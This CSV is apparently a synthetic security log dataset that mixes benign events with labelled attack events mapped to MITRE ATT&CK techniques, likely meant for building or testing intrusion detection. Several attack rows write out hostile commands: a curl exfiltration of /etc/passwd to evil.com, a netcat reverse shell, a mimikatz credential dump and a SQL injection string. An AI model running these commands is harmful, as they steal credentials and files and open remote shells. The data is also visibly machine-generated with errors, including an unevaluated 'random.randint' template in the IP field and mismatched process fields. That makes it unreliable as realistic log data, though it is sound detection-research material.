@timestamp,label,attack_name,mitre_technique,mitre_tactic,event.category,event.outcome,source.ip,source.port,destination.ip,destination.port,network.bytes,network.packets,agent.hostname,agent.type,user.name,process.pid,process.name,process.command_line,file_name,domain
2026-09-15T10:52:32.548615,benign,,,,authentication,success,192.168.1.239,4096,10.0.3.158,53,8636,49,web100,windows,lisa.wilson,248,apache2,explorer.exe,,
2026-09-12T23:24:44.556011,benign,,,,authentication,success,192.168.1.21,1024,10.0.1.162,80,3477,30,web20,linux,john.doe,7348,firefox.exe,explorer.exe,,
2026-09-13T11:01:01.556416,benign,,,,process,success,192.168.1.131,4096,10.0.4.123,3306,1222,73,backup2,linux,david.moore,7459,systemd,chrome.exe --profile-directory=Default,,
2026-09-09T09:47:28.546161,attack,credential_dump,T1003,credential_access,process,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,5131,10,web5,windows,test,1329,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-12T21:41:49.544163,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.6,11467,"10.0.0.{random.randint(1, 254)}",22,1135,1,mail5,windows,test,8824,bash,,,
2026-09-09T16:33:27.540857,attack,sql_injection,T1190,initial_access,web,success,192.168.56.9,5407,"10.0.0.{random.randint(1, 254)}",80,2888,27,db4,linux,guest,4635,powershell.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-12T05:38:11.543549,attack,reverse_shell,T1059,execution,process,success,192.168.56.8,37714,"10.0.0.{random.randint(1, 254)}",4444,4686,41,workstation4,windows,root,6274,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-10T18:34:50.555214,benign,,,,network,success,192.168.1.57,2048,10.0.0.183,53,8471,68,web100,windows,lisa.wilson,250,firefox.exe,firefox.exe,,
2026-09-09T07:55:39.554886,benign,,,,authentication,success,192.168.1.98,4096,10.0.4.135,3306,5444,33,workstation10,linux,emily.davis,9446,apache2,apache2 -DFOREGROUND,,
2026-09-14T14:46:37.549267,benign,,,,network,success,192.168.1.102,2048,10.0.3.141,3306,1095,80,db50,linux,mark.wilson,2852,systemd,chrome.exe --profile-directory=Default,,
2026-09-13T06:02:28.555190,benign,,,,process,success,192.168.1.144,1024,10.0.0.59,53,1510,58,web50,windows,chris.miller,6298,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-08T18:25:00.541511,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.9,30435,"10.0.0.{random.randint(1, 254)}",53,84404,104,backup4,windows,administrator,1784,powershell.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-12T11:45:40.545408,attack,webshell,T1505,persistence,file,success,192.168.56.7,0,"10.0.0.{random.randint(1, 254)}",0,6384,6,db1,linux,test,5957,php,php /var/www/html/shell.php,shell.php,
2026-09-11T02:30:47.544719,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.2,33706,"10.0.0.{random.randint(1, 254)}",445,44112,303,web10,windows,admin,7758,psexec.exe,,,
2026-09-10T03:01:25.558695,benign,,,,authentication,success,192.168.1.155,5000,10.0.5.240,22,5576,19,backup20,linux,emily.davis,451,explorer.exe,firefox.exe,,
2026-09-11T23:51:12.561940,benign,,,,file,success,192.168.1.67,4096,10.0.2.182,443,5118,29,backup10,windows,admin,271,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-14T23:21:57.546252,attack,sql_injection,T1190,initial_access,web,success,192.168.56.6,46124,"10.0.0.{random.randint(1, 254)}",80,4674,36,backup50,windows,administrator,4348,powershell.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-09T09:10:25.560718,benign,,,,process,success,192.168.1.30,2048,10.0.2.42,53,3778,94,srv1,windows,jane.smith,5603,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-11T23:49:38.550189,benign,,,,process,success,192.168.1.128,5000,10.0.0.250,22,7756,5,app4,linux,david.moore,4432,sshd,apache2 -DFOREGROUND,,
2026-09-13T06:18:02.546312,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.2,15938,"10.0.0.{random.randint(1, 254)}",445,43916,74,workstation100,windows,test,5759,psexec.exe,,,
2026-09-09T01:25:05.545467,attack,webshell,T1505,persistence,file,success,192.168.56.6,0,"10.0.0.{random.randint(1, 254)}",0,7831,2,db20,linux,guest,8004,php,php /var/www/html/shell.php,shell.php,
2026-09-09T10:09:28.558863,benign,,,,authentication,success,192.168.1.229,8443,10.0.1.35,22,5127,86,db100,windows,admin,382,apache2,chrome.exe --profile-directory=Default,,
2026-09-09T20:01:45.546495,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.7,60271,"10.0.0.{random.randint(1, 254)}",443,17888,108,db50,windows,root,7369,powershell.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-11T07:40:54.543832,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.1,40930,"10.0.0.{random.randint(1, 254)}",445,8874,252,app2,windows,root,3614,psexec.exe,,,
2026-09-14T02:55:15.570015,benign,,,,process,success,192.168.1.183,4096,10.0.2.33,80,5052,7,mail4,windows,mike.brown,4909,chrome.exe,firefox.exe,,
2026-09-10T09:32:52.543074,attack,sql_injection,T1190,initial_access,web,success,192.168.56.8,10521,"10.0.0.{random.randint(1, 254)}",80,2286,13,mail4,linux,guest,1719,powershell.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-10T05:41:35.565667,benign,,,,network,success,192.168.1.128,1024,10.0.2.142,22,8797,96,app10,windows,emily.davis,2298,chrome.exe,explorer.exe,,
2026-09-11T12:17:31.542118,attack,reverse_shell,T1059,execution,process,success,192.168.56.2,12962,"10.0.0.{random.randint(1, 254)}",4444,4309,29,srv4,linux,administrator,6965,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-10T10:37:08.569456,benign,,,,authentication,success,192.168.1.166,4096,10.0.5.213,22,8345,97,db2,windows,jane.smith,382,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-12T11:24:14.542991,attack,port_scan,T1046,discovery,network,success,192.168.56.10,23263,"10.0.0.{random.randint(1, 254)}",3306,4209,20,backup20,windows,test,2421,powershell.exe,,,
2026-09-12T23:51:57.551736,benign,,,,process,success,192.168.1.37,5000,10.0.0.217,53,4242,4,web2,windows,john.doe,8471,apache2,apache2 -DFOREGROUND,,
2026-09-14T22:15:06.542450,attack,sql_injection,T1190,initial_access,web,success,192.168.56.2,65283,"10.0.0.{random.randint(1, 254)}",80,1634,22,mail5,linux,guest,2302,cmd.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-13T06:12:15.570476,benign,,,,network,success,192.168.1.189,3072,10.0.2.116,443,6694,88,web100,windows,lisa.wilson,9574,firefox.exe,explorer.exe,,
2026-09-12T18:05:31.570623,benign,,,,file,success,192.168.1.170,3072,10.0.5.72,22,8153,35,app1,linux,lisa.wilson,9861,systemd,firefox.exe,,
2026-09-09T08:46:20.550263,benign,,,,authentication,success,192.168.1.81,3072,10.0.3.133,3306,6919,86,backup50,windows,david.moore,6678,firefox.exe,explorer.exe,,
2026-09-11T12:07:33.555532,benign,,,,network,success,192.168.1.53,8443,10.0.0.112,443,8751,3,workstation50,linux,john.doe,6751,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-14T21:46:43.562308,benign,,,,file,success,192.168.1.61,3072,10.0.4.50,443,2983,34,db4,linux,mike.brown,2319,sshd,explorer.exe,,
2026-09-09T17:33:59.567178,benign,,,,network,success,192.168.1.136,3072,10.0.4.108,80,2248,64,app10,windows,mike.brown,3753,apache2,chrome.exe --profile-directory=Default,,
2026-09-08T22:56:20.571238,benign,,,,network,success,192.168.1.243,2048,10.0.3.100,80,3586,11,backup50,linux,david.moore,6286,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T07:47:07.552584,benign,,,,network,success,192.168.1.160,1024,10.0.5.199,3306,7063,30,srv50,linux,david.moore,7990,sshd,chrome.exe --profile-directory=Default,,
2026-09-14T05:07:18.562401,benign,,,,authentication,success,192.168.1.248,8443,10.0.3.136,3306,7269,1,mail5,windows,mark.wilson,3226,sshd,chrome.exe --profile-directory=Default,,
2026-09-09T22:56:32.566003,benign,,,,authentication,success,192.168.1.172,1024,10.0.0.7,53,2277,33,web1,linux,mike.brown,7065,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-11T04:19:21.540430,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.9,22250,"10.0.0.{random.randint(1, 254)}",22,1706,12,mail4,linux,admin,7104,bash,,,
2026-09-10T14:02:24.540636,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.10,41908,"10.0.0.{random.randint(1, 254)}",445,47641,144,db50,linux,test,1496,psexec.exe,,,
